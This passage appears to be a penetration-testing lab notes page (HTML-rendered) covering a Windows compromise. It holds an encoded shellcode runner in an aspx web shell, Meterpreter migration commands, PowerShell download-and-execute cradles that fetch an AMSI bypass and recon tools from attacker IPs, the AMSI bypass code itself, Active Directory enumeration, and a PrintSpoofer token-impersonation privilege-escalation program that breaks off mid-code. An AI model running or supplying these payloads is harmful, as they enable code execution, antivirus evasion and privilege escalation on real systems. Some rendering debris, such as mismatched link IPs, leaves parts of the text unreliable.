style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x06</span>, <span style="color:#ff0044;font-weight:400">0x43</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0x48</span>, <span style="color:#ff0044;font-weight:400">0xa0</span>, <span style="color:#ff0044;font-weight:400">0x88</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xf3</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x4f</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc4</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0x08</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x7d</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0x21</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0x8a</span>, <span style="color:#ff0044;font-weight:400">0x15</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0xf2</span>, <span style="color:#ff0044;font-weight:400">0x37</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd1</span>, <span style="color:#ff0044;font-weight:400">0x76</span>, <span style="color:#ff0044;font-weight:400">0x04</span>, <span style="color:#ff0044;font-weight:400">0xed</span>, <span style="color:#ff0044;font-weight:400">0xac</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0x57</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x42</span>, <span style="color:#ff0044;font-weight:400">0x5c</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xd3</span>, <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0xe4</span>, <span style="color:#ff0044;font-weight:400">0x12</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x12</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0xa6</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0xe7</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x95</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x55</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xe9</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xf3</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xdc</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xbc</span>, <span style="color:#ff0044;font-weight:400">0x14</span>, <span style="color:#ff0044;font-weight:400">0x98</span>, <span style="color:#ff0044;font-weight:400">0x8b</span>, <span style="color:#ff0044;font-weight:400">0xe4</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x85</span>, <span style="color:#ff0044;font-weight:400">0xc6</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x76</span>, <span style="color:#ff0044;font-weight:400">0xb4</span>, <span style="color:#ff0044;font-weight:400">0x68</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x09</span>, <span style="color:#ff0044;font-weight:400">0x4a</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xc5</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x77</span>, <span style="color:#ff0044;font-weight:400">0xd4</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0xc5</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0x6c</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0x5b</span>, <span style="color:#ff0044;font-weight:400">0x4b</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc4</span>, <span style="color:#ff0044;font-weight:400">0xf2</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xa4</span>, <span style="color:#ff0044;font-weight:400">0x58</span>, <span style="color:#ff0044;font-weight:400">0x01</span>, <span style="color:#ff0044;font-weight:400">0xd7</span>};<br /><br />                    <span style="color:#ff9d00;font-weight:700">for</span>(<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; anQJWGtXVfgE.Length; i++)<br />            {<br />                anQJWGtXVfgE[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)(((<span style="color:#7f0044;font-weight:400">uint</span>)anQJWGtXVfgE[i] - <span style="color:#ff0044;font-weight:400">5</span>) &amp; <span style="color:#ff0044;font-weight:400">0xFF</span>);<br />            }<br /><br />        IntPtr gh9Sh57 = VirtualAlloc(IntPtr.Zero,(UIntPtr)anQJWGtXVfgE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br />        System.Runtime.InteropServices.Marshal.Copy(anQJWGtXVfgE,<span style="color:#ff0044;font-weight:400">0</span>,gh9Sh57,anQJWGtXVfgE.Length);<br />        IntPtr fXhVkDyOY = IntPtr.Zero;<br />        IntPtr lx5Qh_ = CreateThread(IntPtr.Zero,UIntPtr.Zero,gh9Sh57,IntPtr.Zero,<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff9d00;font-weight:700">ref</span> fXhVkDyOY);<br />    }<br />&lt;/script&gt;<br /></pre></div></p><p></p><p></p><p></p><p><h2>Post exploitation enumeration</h2><ul><li>sysinfo =&gt; build number <h3>17763 equates to Windows 10 version 1809 or Windows Server 2019.</h3></li></ul></p><p></p><p>The primary issue here is that our initial Meterpreter shell is based on the aspx web shell, which means our shell will die if the web worker process times out. We can solve this by migrating our shell to a different process.<ul><li>execute -H -f notepad</li><li>migrate 620</li></ul></p><p>### w<h3>e would like to determine which AV product is in place in order to simplify our bypass attempt. We also need to know if the antivirus supports AMSI.</h3></p><p>(new-object system.net.webclient).downloadstring(&#39;<a href="http://192.168.119.120/HostRecon.ps1')">http://192.168.45.226/HostRecon.ps1&#39;)</a> | IEX</p><p>Invoke-HostRecon</p><p></p><p></p><p></p><p><h2>AD recon</h2></p><p>## <h3>Besides enumerating computers, users, and groups, we should also consider enumerating Kerberos delegation, including constrained delegation:</h3></p><p></p><p></p><p></p><p></p><p><div class="codebox"><pre><br /><span style="color:#0088ff;font-weight:400">## bypass amsi</span><br /><span style="color:#0088ff;font-weight:400">### amsi.txt</span><br /><span style="color:#0088ff;font-weight:400">$a</span><span style="color:#ff9d00;font-weight:700">=</span>[Ref].Assembly.GetTypes();<span style="color:#ff9d00;font-weight:700">Foreach</span>(<span style="color:#0088ff;font-weight:400">$b</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$a</span>) {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$b</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;*iUtils&quot;</span>) {<span style="color:#0088ff;font-weight:400">$c</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$b</span>}};<span style="color:#0088ff;font-weight:400">$d</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$c</span>.GetFields(<span style="color:#333333;font-weight:400">&#39;NonPublic,Static&#39;</span>);<span style="color:#ff9d00;font-weight:700">Foreach</span>(<span style="color:#0088ff;font-weight:400">$e</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$d</span>) {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$e</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;*Context&quot;</span>) {<span style="color:#0088ff;font-weight:400">$f</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$e</span>}};<span style="color:#0088ff;font-weight:400">$g</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$f</span>.GetValue(<span style="color:#0088ff;font-weight:400">$null</span>);[IntPtr]<span style="color:#0088ff;font-weight:400">$ptr</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$g</span>;[<span style="color:#7f0044;font-weight:400">Int32</span>[]]<span style="color:#0088ff;font-weight:400">$buf</span> <span style="color:#ff9d00;font-weight:700">=</span> @(<span style="color:#333333;font-weight:400">0</span>);[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$buf</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$ptr</span>, <span style="color:#333333;font-weight:400">1</span>)<br /><span style="color:#0088ff;font-weight:400">### execute amsi bypass </span><br />(<span style="color:#ff9d00;font-weight:700">new-object</span> system.net.webclient).downloadstring(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/amsi.txt&#39;</span>) | <span style="color:#ff9d00;font-weight:700">IEX</span><br /><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.228/PowerView.ps1&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400">## AD enum users groups, etc</span><br /><span style="color:#0088ff;font-weight:400">### verify lsa protection</span><br /><span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path HKLM<span style="color:#ff9d00;font-weight:700">:\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;RunAsPPL&quot;</span><br /><span style="color:#0088ff;font-weight:400">###  ppLocker rules do not apply to the built-in local accounts such as Local System, Local Service, or Network Service. Neither do they apply to the IIS DefaultAppPool account, which means we only have to worry about AppLocker if we migrate into a process of a different user.</span><br /><br /><span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#ff9d00;font-weight:700">-</span>Path HKLM<span style="color:#ff9d00;font-weight:700">:\</span>SOFTWARE<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>SrpV2<span style="color:#ff9d00;font-weight:700">\</span>Exe<br /><span style="color:#0088ff;font-weight:400">## kerberos delegation</span><br /><span style="color:#00117f;font-weight:400">Get-DomainComputer</span> <span style="color:#ff9d00;font-weight:700">-</span>TrustedToAuth<br /><span style="color:#0088ff;font-weight:400">## we need privs as system                                                                              </span><br />whoami <span style="color:#ff9d00;font-weight:700">/</span>priv <br /><span style="color:#0088ff;font-weight:400">## privec (printspoofer) custom </span></pre></div></p><p></p><p></p><p></p><p><h2>Privesc</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Security.Principal;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Text;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> PrintSpoofer<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_ACCESS_DUPLEX = <span style="color:#ff0044;font-weight:400">0x3</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_TYPE_BYTE = <span style="color:#ff0044;font-weight:400">0x0</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> PIPE_WAIT = <span style="color:#ff0044;font-weight:400">0x0</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKEN_ALL_ACCESS = <span style="color:#ff0044;font-weight:400">0xF01FF</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKENUSER = <span style="color:#ff0044;font-weight:400">1</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> SECURITY_IMPERSONATION = <span style="color:#ff0044;font-weight:400">2</span>;<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">uint</span> TOKEN_PRIMARY = <span style="color:#ff0044;font-weight:400">1</span>;<br /><br />        [StructLayout(LayoutKind.Sequential)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> PROCESS_INFORMATION<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hProcess;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hThread;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">int</span> dwProcessId;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">int</span> dwThreadId;<br />        }<br />        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">struct</span> STARTUPINFO<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 cb;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpReserved;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpDesktop;<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#7f0044;font-weight:400">string</span> lpTitle;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwX;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwY;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwXSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwYSize;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwXCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwYCountChars;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwFillAttribute;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int32 dwFlags;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int16 wShowWindow;<br />            <span style="color:#ff9d00;font-weight:700">public</span> Int16 cbReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr lpReserved2;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdInput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdOutput;<br />            <span style="color:#ff9d00;font-weight:700">public</span> IntPtr hStdError;<br />        }<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">enum</span> CreationFlags<br />        {<br />            DefaultErrorMode = <span style="color:#ff0044;font-weight:400">0x04000000</span>,<br />            NewConsole = <span style="color:#ff0044;font-weight:400">0x00000010</span>,<br />            NewProcessGroup = <span style="color:#ff0044;font-weight:400">0x00000200</span>,<br />            SeparateWOWVDM = <span style="color:#ff0044;font-weight:400">0x00000800</span>,<br />            Suspended = <span style="color:#ff0044;font-weight:400">0x00000004</span>,<br />            UnicodeEnvironment = <span style="color:#ff0044;font-weight:400">0x00000400</span>,<br />            ExtendedStartupInfoPresent = <span style="color:#ff0044;font-weight:400">0x00080000</span><br />        }<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">enum</span> LogonFlags<br />        {<br />            WithProfile = <span style="color:#ff0044;font-weight:400">1</span>,<br />            NetCredentialsOnly<br />        }<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateNamedPipe(<span style="color:#7f0044;font-weight:400">string</span> lpName, <span style="color:#7f0044;font-weight:400">uint</span> dwOpenMode, <span style="color:#7f0044;font-weight:400">uint</span> dwPipeMode, <span style="color:#7f0044;font-weight:400">uint</span> nMaxInstances, <span style="color:#7f0044;font-weight:400">uint</span> nOutBufferSize, <span style="color:#7f0044;font-weight:400">uint</span> nInBufferSize, <span style="color:#7f0044;font-weight:400">uint</span> nDefaultTimeOut, IntPtr lpSecurityAttributes);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;Advapi32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> ImpersonateNamedPipeClient(IntPtr hNamedPipe);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> OpenThreadToken(IntPtr ThreadHandle, <span style="color:#7f0044;font-weight:400">uint</span> DesiredAccess, <span style="color:#7f0044;font-weight:400">bool</span> OpenAsSelf, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr TokenHandle);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr GetCurrentThread();<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, CharSet = CharSet.Unicode)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, <span style="color:#7f0044;font-weight:400">string</span> lpApplicationName, <span style="color:#7f0044;font-weight:400">string</span> lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, <span style="color:#7f0044;font-weight:400">string</span> lpCurrentDirectory, [In] <span style="color:#ff9d00;font-weight:700">ref</span> STARTUPINFO lpStartupInfo, <span style="color:#ff9d00;font-weight:700">out</span> PROCESS_INFORMATION lpProcessInformation);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, CharSet = CharSet.Auto, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">bool</span> DuplicateTokenEx(IntPtr hExistingToken, <span style="color:#7f0044;font-weight:400">uint</span> dwDesiredAccess, IntPtr lpTokenAttributes, <span style="color:#7f0044;font-weight:400">uint</span> ImpersonationLevel, <span style="color:#7f0044;font-weight:400">uint</span> TokenType, <span style="color:#ff9d00;font-weight:700">out</span> IntPtr phNewToken);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;advapi32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> RevertToSelf();<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">uint</span> GetSystemDirectory([Out] StringBuilder lpBuffer, <span style="color:#7f0044;font-weight:400">uint</span> uSize);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;userenv.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> CreateEnvironmentBlock(<span style="color:#ff9d00;font-weight:700">out</span> IntPtr lpEnvironment, IntPtr hToken, <span style="color:#7f0044;font-weight:400">bool</span> bInherit);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// Parse arguments (pipe name)</span><br />            <span style="color:#ff9d00;font-weight:700">if</span> (args.Length != <span style="color:#ff0044;font-weight:400">2</span>)<br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Please enter the pipe name to be used and the binary to trigger as arguments.\nExample: .\\PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss c:\\windows\\tasks\\bin.exe&quot;</span>);<br />                <span style="color:#ff9d00;font-weight:700">return</span>;<br />            }<br />            <span style="color:#7f0044;font-weight:400">string</span> pipeName = args[<span style="color:#ff0044;font-weight:400">0</span>];<br />            <span style="color:#7f0044;font-weight:400">string</span> binToRun = args[<span style="color:#ff0044;font-weight:400">1</span>];<br /><br />            <span style="color:#0088ff;font-weight:400">// Create our named pipe</span><br />            IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, <span style="color:#ff0044;font-weight:400">10</span>, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0x1000</span>, <span style="color:#ff0044;font-weight:400">0</span>, IntPtr.Zero);<br /><br />            <span style="color:#0088ff;font-weight:400">// Connect to our named pipe and wait for another client to connect</span><br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;Waiting for client to connect to named pipe...&quot;</span>);<br />            <span style="color:#7f0044;font-weight:400">bool</span> result = ConnectNamedPipe(hPipe, IntPtr.Zero);<br /><br />            <span style="color:#0088ff;font-weight:400">// Impersonate the token of the incoming connection</span><br />            result = ImpersonateNamedPipeClient(hPipe);<br /><br />            <span style="color:#0088ff;font-weight:400">// Open a handle on the impersonated token</span><br />            IntPtr tokenHandle;<br />            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, <span style="color:#ff0044;font-weight:400">false</span>, <span style="color:#ff9d00;font-weight:700">out</span> tokenHandle);<br /><br />            <span style="color:#0088ff;font-weight:400">// Duplicate the stolen token</span><br />            IntPtr sysToken = IntPtr.Zero;<br />            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, <span style="color:#ff9d00;font-weight:700">out</span> sysToken);<br /><br />            <span style="color:#0088ff;font-weight:400">// Create an environment block for the non-interactive session</span><br />            IntPtr env = IntPtr.Zero;<br />            <span style="color:#7f0044;font-weight:400">bool</span> res = CreateEnvironmentBlock(<span style="color:#ff9d00;font-weight:700">out</span> env, sysToken, <span style="color:#ff0044;font-weight:400">false</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get the impersonated identity and revert to self to ensure we have impersonation privs</span><br />            String name = WindowsIdentity.GetCurrent().Name;<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Impersonated user is: 